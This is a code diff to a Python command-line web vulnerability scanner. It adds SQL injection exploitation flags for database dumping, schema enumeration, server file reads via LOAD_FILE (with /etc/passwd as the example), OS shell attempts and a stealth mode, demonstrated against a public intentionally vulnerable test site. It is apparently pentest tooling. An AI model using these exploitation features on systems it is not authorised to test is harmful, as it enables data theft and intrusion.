@@ -56,7 +56,7 @@ class ScanCommand:
     # Command metadata - self-documenting for help system
     description = "Perform web vulnerability scans on target URLs"
     usage = "scan <target_url> [options]"
-    example = "scan https://example.com --modules sqli,xss --output report.txt"
+    example = "scan http://testphp.vulnweb.com/ --modules sqli,xss --output report.txt"
     category = "Scanning"
     
     def __init__(self):
@@ -165,7 +165,15 @@ class ScanCommand:
             'output': None,
             'verbose': self.config.get('output', {}).get('verbose', True),
             'threads': self.config.get('scanning', {}).get('threads', 5),
-            'timeout': self.config.get('network', {}).get('timeout', 10)
+            'timeout': self.config.get('network', {}).get('timeout', 10),
+            # Advanced exploitation options
+            'dump': False,
+            'dump_tables': False,
+            'dump_data': False,
+            'exploit': False,
+            'file_read': None,
+            'os_shell': False,
+            'stealth': False
         }
         
         # Process additional arguments
@@ -211,6 +219,28 @@ class ScanCommand:
                 i += 1
             elif arg == '--quiet':
                 scan_params['verbose'] = False
+                i += 1
+            # Advanced exploitation options
+            elif arg == '--dump':
+                scan_params['dump'] = True
+                i += 1
+            elif arg == '--dump-tables':
+                scan_params['dump_tables'] = True
+                i += 1
+            elif arg == '--dump-data':
+                scan_params['dump_data'] = True
+                i += 1
+            elif arg == '--exploit':
+                scan_params['exploit'] = True
+                i += 1
+            elif arg == '--file-read' and i + 1 < len(parts):
+                scan_params['file_read'] = parts[i + 1]
+                i += 2
+            elif arg == '--os-shell':
+                scan_params['os_shell'] = True
+                i += 1
+            elif arg == '--stealth':
+                scan_params['stealth'] = True
                 i += 1
             else:
                 print(f"[{Colors.YELLOW}!{Colors.ENDC}] Warning: Unknown argument '{arg}', ignoring")
@@ -307,6 +337,10 @@ class ScanCommand:
         
         # Display results
         self._display_results(params['verbose'])
+        
+        # Run advanced exploitation if requested
+        if self._should_run_exploitation(params):
+            await self._run_exploitation(session, params)
         
         # Save results if output specified
         if params['output']:
@@ -568,8 +602,15 @@ class ScanCommand:
             print("\nBy Severity:")
             for severity, count in summary['by_severity'].items():
                 if count > 0:
-                    severity_icon = "🔴" if severity == 'Critical' else "🟠" if severity == 'High' else "🟡" if severity == 'Medium' else "🟢"
-                    print(f"  {severity_icon} {severity}: {count}")
+                    if severity == 'Critical':
+                        severity_display = f"{Colors.RED}[CRITICAL]{Colors.ENDC}"
+                    elif severity == 'High':
+                        severity_display = f"{Colors.RED}[HIGH]{Colors.ENDC}"
+                    elif severity == 'Medium':
+                        severity_display = f"{Colors.YELLOW}[MEDIUM]{Colors.ENDC}"
+                    else:
+                        severity_display = f"{Colors.GREEN}[LOW]{Colors.ENDC}"
+                    print(f"  {severity_display} {severity}: {count}")
             
             # Display grouped vulnerabilities (cleaner CLI output)
             print("\nVulnerabilities Found:")
@@ -581,7 +622,7 @@ class ScanCommand:
                 examples = group_info['examples']
                 
                 # Main vulnerability type with count
-                print(f"\n🔍 {base_type}: {count} vulnerabilities")
+                print(f"\n{Colors.CYAN}[SCAN]{Colors.ENDC} {base_type}: {count} vulnerabilities")
                 
                 # Show subtypes if there are multiple
                 if len(subtypes) > 1:
@@ -608,12 +649,12 @@ class ScanCommand:
             
             # Option to show all details
             if not verbose and summary['total_vulnerabilities'] > ScanLimits.MAX_DETAILS_DISPLAY:
-                print(f"\n💡 Use --verbose flag or check the detailed report for all {summary['total_vulnerabilities']} vulnerabilities")
+                print(f"\n{Colors.BLUE}[INFO]{Colors.ENDC} Use --verbose flag or check the detailed report for all {summary['total_vulnerabilities']} vulnerabilities")
             elif verbose and summary['total_vulnerabilities'] > ScanLimits.MAX_VERBOSE_DISPLAY:
-                print(f"\n📄 All {summary['total_vulnerabilities']} vulnerabilities with exploitation guidance saved to report file")
+                print(f"\n{Colors.BLUE}[REPORT]{Colors.ENDC} All {summary['total_vulnerabilities']} vulnerabilities with exploitation guidance saved to report file")
                 
         else:
-            print("\n✅ No vulnerabilities detected")
+            print(f"\n{Colors.GREEN}[SECURE]{Colors.ENDC} No vulnerabilities detected")
             print("   Target appears to be properly secured against tested attack vectors")
     
     def _save_results(self, output_file):
@@ -689,7 +730,7 @@ class ScanCommand:
             
             # Educational note
             if any('html' in f for f in generated_files):
-                print(f"\n{Colors.CYAN}💡 Pro Tip:{Colors.ENDC}")
+                print(f"\n{Colors.CYAN}[TIP]{Colors.ENDC} Pro Tip:")
                 print("  Open the HTML report in your browser for interactive learning content!")
                 print("  It includes remediation guidance, code examples, and security best practices.")
                 print(f"  Location: {results_dir.absolute()}")
@@ -719,34 +760,34 @@ class ScanCommand:
 <body>
     <div class="container">
         <div class="header">
-            <h1>🛡️ ReconScan Security Report</h1>
+            <h1>ReconScan Security Report</h1>
             <p>Target: {self.results.get('scan_info', {}).get('target', 'Unknown')}</p>
         </div>
         
         <div class="success">
-            ✅ No vulnerabilities detected
+            [SECURE] No vulnerabilities detected
         </div>
         
         <div class="info">
-            <h3>🎯 Scan Summary</h3>
+            <h3>[SUMMARY] Scan Summary</h3>
             <p>Your target appears to be properly secured against the tested attack vectors.</p>
         </div>
         
         <div class="scan-info">
             <div class="scan-detail">
-                <h4>📊 Scan Information</h4>
+                <h4>[INFO] Scan Information</h4>
                 <p><strong>Duration:</strong> {self.results.get('scan_info', {}).get('duration', 'Unknown')}</p>
                 <p><strong>Modules:</strong> {', '.join(self.results.get('scan_info', {}).get('modules_used', []))}</p>
             </div>
             <div class="scan-detail">
-                <h4>🔒 Security Status</h4>
+                <h4>[STATUS] Security Status</h4>
                 <p><strong>Total Vulnerabilities:</strong> 0</p>
                 <p><strong>Security Level:</strong> <span style="color: #4CAF50;">Good</span></p>
             </div>
         </div>
         
         <div class="info">
-            <h3>📚 Additional Resources</h3>
+            <h3>[RESOURCES] Additional Resources</h3>
             <p>For comprehensive educational security reports with learning content, ensure all ReconScan components are properly installed.</p>
         </div>
     </div>
@@ -795,7 +836,7 @@ class ScanCommand:
     def _show_usage(self):
         """Display usage information."""
         print("Usage: scan <target_url> [options]")
-        print("\nOptions:")
+        print("\nBasic Options:")
         print("  --modules <list>    Comma-separated list of modules to run")
         print("                      Available: " + ", ".join(self.available_modules.keys()))
         print("  --output <file>     Save results in multiple formats (.txt, .json, .html)")
@@ -803,13 +844,283 @@ class ScanCommand:
         print("  --timeout <sec>     HTTP timeout in seconds (default: 10)")
         print("  --verbose           Enable verbose output (default)")
         print("  --quiet             Disable verbose output")
+        print("\nAdvanced SQL Exploitation:")
+        print("  --dump              Enable database data extraction")
+        print("  --dump-tables       Extract only table structures")
+        print("  --dump-data         Extract only table data")
+        print("  --exploit           Enable advanced exploitation attempts")
+        print("  --file-read <path>  Attempt to read specific file from server")
+        print("  --os-shell          Attempt to get OS command execution")
+        print("  --stealth           Use slower, stealthier exploitation methods")
         print("\nOutput Formats:")
         print("  When using --output results, generates in results/ directory:")
         print("    • results.txt  - Traditional formatted scan results")
         print("    • results.json - Structured data for automation/tools")
         print("    • results.html - Interactive educational security report")
-        print("\nExamples:")
-        print("  scan https://example.com")
-        print("  scan https://example.com --modules sqli,xss,headers")
-        print("  scan https://example.com --output results --threads 10")
-        print("  scan https://example.com --modules lfi,cmdinjection --quiet")
+        print("\nBasic Examples:")
+        print("  scan http://testphp.vulnweb.com/")
+        print("  scan http://testphp.vulnweb.com/ --modules sqli,xss,headers")
+        print("  scan http://testphp.vulnweb.com/ --output results --threads 10")
+        print("\nAdvanced Exploitation Examples:")
+        print("  scan http://testphp.vulnweb.com/ --dump --output exploit_results")
+        print("  scan http://testphp.vulnweb.com/ --exploit --dump --stealth")
+        print("  scan http://testphp.vulnweb.com/ --file-read /etc/passwd --output results")
+        print("  scan http://testphp.vulnweb.com/ --dump-tables --dump-data --threads 5")
+    
+    def _should_run_exploitation(self, params):
+        """Check if exploitation should be run based on parameters and findings."""
+        # Check if any exploitation flags are set
+        exploitation_flags = params.get('dump') or params.get('dump_tables') or \
+                           params.get('dump_data') or params.get('exploit') or \
+                           params.get('file_read') or params.get('os_shell')
+        
+        if not exploitation_flags:
+            return False
+        
+        # Check if we have SQL injection vulnerabilities to exploit
+        sql_vulns = [v for v in self.results.get('vulnerabilities', []) 
+                    if 'SQL Injection' in v.get('type', '')]
+        
+        if not sql_vulns:
+            if params.get('verbose'):
+                print(f"\n{Colors.YELLOW}[!]{Colors.ENDC} Advanced exploitation requested but no SQL injection vulnerabilities found")
+            return False
+            
+        return True
+    
+    async def _run_exploitation(self, session, params):
+        """Run advanced SQL injection exploitation."""
+        try:
+            from scanner.commands.scanning.vulnerability_scanners.sql_injection.advanced_exploitation_engine import (
+                AdvancedExploitationEngine, ExploitationContext, ExtractionTarget, ExtractionTechnique
+            )
+            from scanner.commands.scanning.vulnerability_scanners.sql_injection.sql_payload_crafting_engine import DatabaseType
+            from scanner.commands.scanning.shared.injection_discovery import InjectionPoint, InjectionPointType
+            
+            print(f"\n{Colors.CYAN}[EXPLOIT]{Colors.ENDC} ADVANCED SQL INJECTION EXPLOITATION")
+            print("=" * 60)
+            
+            # Get SQL injection vulnerabilities
+            sql_vulns = [v for v in self.results.get('vulnerabilities', []) 
+                        if 'SQL Injection' in v.get('type', '')]
+            
+            if not sql_vulns:
+                return
+            
+            # Initialize exploitation engine
+            engine = AdvancedExploitationEngine(session)
+            
+            # Track exploitation results
+            exploitation_results = []
+            
+            # Process each SQL injection vulnerability
+            for i, vuln in enumerate(sql_vulns[:3], 1):  # Limit to first 3 for demo
+                print(f"\n{Colors.BLUE}[*]{Colors.ENDC} Exploiting vulnerability {i}/{min(len(sql_vulns), 3)}")
+                print(f"    URL: {vuln.get('url', 'Unknown')}")
+                print(f"    Parameter: {vuln.get('parameter', 'Unknown')}")
+                
+                try:
+                    # Create injection point from vulnerability
+                    injection_point = self._create_injection_point_from_vuln(vuln)
+                    
+                    # Create exploitation context
+                    context = ExploitationContext(
+                        injection_point=injection_point,
+                        database_type=DatabaseType.MYSQL,  # Default, could be detected
+                        extraction_technique=ExtractionTechnique.BINARY_SEARCH,
+                        threads=params.get('threads', 5),
+                        delay=0.5 if params.get('stealth') else 0.1
+                    )
+                    
+                    # Run basic information extraction
+                    basic_info = await self._extract_basic_info(engine, context, params)
+                    exploitation_results.append(basic_info)
+                    
+                    # Run advanced exploitation based on flags
+                    if params.get('dump') or params.get('dump_tables') or params.get('dump_data'):
+                        schema_info = await self._extract_schema_info(engine, context, params)
+                        exploitation_results.append(schema_info)
+                    
+                    if params.get('file_read'):
+                        file_content = await self._attempt_file_read(engine, context, params)
+                        exploitation_results.append(file_content)
+                    
+                    if params.get('exploit'):
+                        advanced_results = await self._run_advanced_exploitation(engine, context, params)
+                        exploitation_results.extend(advanced_results)
+                        
+                except Exception as e:
+                    print(f"    {Colors.RED}[-]{Colors.ENDC} Exploitation failed: {str(e)}")
+                    continue
+            
+            # Store exploitation results
+            self.results['exploitation'] = {
+                'enabled': True,
+                'results': exploitation_results,
+                'flags_used': {
+                    'dump': params.get('dump', False),
+                    'dump_tables': params.get('dump_tables', False),
+                    'dump_data': params.get('dump_data', False),
+                    'exploit': params.get('exploit', False),
+                    'file_read': params.get('file_read'),
+                    'os_shell': params.get('os_shell', False),
+                    'stealth': params.get('stealth', False)
+                }
+            }
+            
+            print(f"\n{Colors.GREEN}[+]{Colors.ENDC} Advanced exploitation completed!")
+            print(f"    Results: {len(exploitation_results)} extraction operations")
+            
+        except ImportError as e:
+            print(f"{Colors.RED}[-]{Colors.ENDC} Advanced exploitation engine not available: {e}")
+        except Exception as e:
+            print(f"{Colors.RED}[-]{Colors.ENDC} Exploitation error: {str(e)}")
+    
+    def _create_injection_point_from_vuln(self, vuln):
+        """Create an InjectionPoint object from vulnerability data."""
+        from scanner.commands.scanning.shared.injection_discovery import InjectionPoint, InjectionPointType, ParameterType
+        
+        # Determine injection point type from vulnerability
+        method = vuln.get('method', 'GET').upper()
+        injection_type = InjectionPointType.QUERY_PARAMETER if method == 'GET' else InjectionPointType.POST_PARAMETER
+        
+        # Determine parameter type from value
+        value = vuln.get('original_value', '1')
+        if value.isdigit():
+            parameter_type = ParameterType.NUMERIC
+        else:
+            parameter_type = ParameterType.STRING
+        
+        return InjectionPoint(
+            name=vuln.get('parameter', ''),
+            value=value,
+            injection_type=injection_type,
+            parameter_type=parameter_type,
+            url=vuln.get('url', ''),
+            method=method,
+            location=injection_type.value,
+            test_priority=8  # High priority for exploitation
+        )
+    
+    async def _extract_basic_info(self, engine, context, params):
+        """Extract basic database information."""
+        from scanner.commands.scanning.vulnerability_scanners.sql_injection.advanced_exploitation_engine import ExtractionTarget
+        
+        print(f"    {Colors.CYAN}[*]{Colors.ENDC} Extracting basic database information...")
+        
+        results = {}
+        
+        # Extract database version
+        try:
+            version_result = await engine.extract_data(context, ExtractionTarget.DATABASE_VERSION)
+            if version_result.success:
+                print(f"        {Colors.GREEN}[+]{Colors.ENDC} Database version: {version_result.data}")
+                results['version'] = version_result.data
+        except Exception as e:
+            print(f"        {Colors.YELLOW}[!]{Colors.ENDC} Version extraction failed: {e}")
+        
+        # Extract current user
+        try:
+            user_result = await engine.extract_data(context, ExtractionTarget.CURRENT_USER)
+            if user_result.success:
+                print(f"        {Colors.GREEN}[+]{Colors.ENDC} Current user: {user_result.data}")
+                results['current_user'] = user_result.data
+        except Exception as e:
+            print(f"        {Colors.YELLOW}[!]{Colors.ENDC} User extraction failed: {e}")
+        
+        # Extract current database
+        try:
+            db_result = await engine.extract_data(context, ExtractionTarget.CURRENT_DATABASE)
+            if db_result.success:
+                print(f"        {Colors.GREEN}[+]{Colors.ENDC} Current database: {db_result.data}")
+                results['current_database'] = db_result.data
+        except Exception as e:
+            print(f"        {Colors.YELLOW}[!]{Colors.ENDC} Database extraction failed: {e}")
+        
+        return {
+            'type': 'basic_info',
+            'data': results,
+            'timestamp': time.time()
+        }
+    
+    async def _extract_schema_info(self, engine, context, params):
+        """Extract database schema information."""
+        print(f"    {Colors.CYAN}[*]{Colors.ENDC} Extracting database schema...")
+        
+        results = {}
+        
+        if params.get('dump_tables') or params.get('dump'):
+            try:
+                schema_info = await engine.enumerate_schema(context)
+                print(f"        {Colors.GREEN}[+]{Colors.ENDC} Found {len(schema_info.tables)} tables")
+                for table in schema_info.tables[:5]:  # Show first 5
+                    print(f"            • {table}")
+                if len(schema_info.tables) > 5:
+                    print(f"            ... and {len(schema_info.tables) - 5} more")
+                
+                results['schema'] = {
+                    'database': schema_info.database_name,
+                    'tables': schema_info.tables,
+                    'columns': schema_info.columns,
+                    'sensitive_tables': schema_info.sensitive_tables
+                }
+            except Exception as e:
+                print(f"        {Colors.YELLOW}[!]{Colors.ENDC} Schema extraction failed: {e}")
+        
+        return {
+            'type': 'schema_info',
+            'data': results,
+            'timestamp': time.time()
+        }
+    
+    async def _attempt_file_read(self, engine, context, params):
+        """Attempt to read files from the server."""
+        file_path = params.get('file_read')
+        print(f"    {Colors.CYAN}[*]{Colors.ENDC} Attempting to read file: {file_path}")
+        
+        results = {}
+        
+        try:
+            # Create custom query for file reading (MySQL example)
+            file_query = f"SELECT LOAD_FILE('{file_path}')"
+            
+            from scanner.commands.scanning.vulnerability_scanners.sql_injection.advanced_exploitation_engine import ExtractionTarget
+            file_result = await engine.extract_data(context, ExtractionTarget.CUSTOM_QUERY, file_query)
+            
+            if file_result.success and file_result.data:
+                print(f"        {Colors.GREEN}[+]{Colors.ENDC} File read successful!")
+                print(f"        {Colors.GREEN}[+]{Colors.ENDC} Content length: {len(str(file_result.data))} chars")
+                results['file_content'] = str(file_result.data)[:1000]  # Limit output
+                results['file_path'] = file_path
+            else:
+                print(f"        {Colors.YELLOW}[!]{Colors.ENDC} File read failed or file not found")
+        except Exception as e:
+            print(f"        {Colors.RED}[-]{Colors.ENDC} File read error: {e}")
+        
+        return {
+            'type': 'file_read',
+            'data': results,
+            'timestamp': time.time()
+        }
+    
+    async def _run_advanced_exploitation(self, engine, context, params):
+        """Run advanced exploitation techniques."""
+        print(f"    {Colors.CYAN}[*]{Colors.ENDC} Running advanced exploitation...")
+        
+        results = []
+        
+        try:
+            # Assess privileges
+            privileges = await engine.assess_privileges(context)
+            print(f"        {Colors.GREEN}[+]{Colors.ENDC} Privilege level: {privileges.name}")
+            
+            results.append({
+                'type': 'privilege_assessment',
+                'data': {'privilege_level': privileges.name},
+                'timestamp': time.time()
+            })
+            
+        except Exception as e:
+            print(f"        {Colors.YELLOW}[!]{Colors.ENDC} Privilege assessment failed: {e}")
+        
+        return results
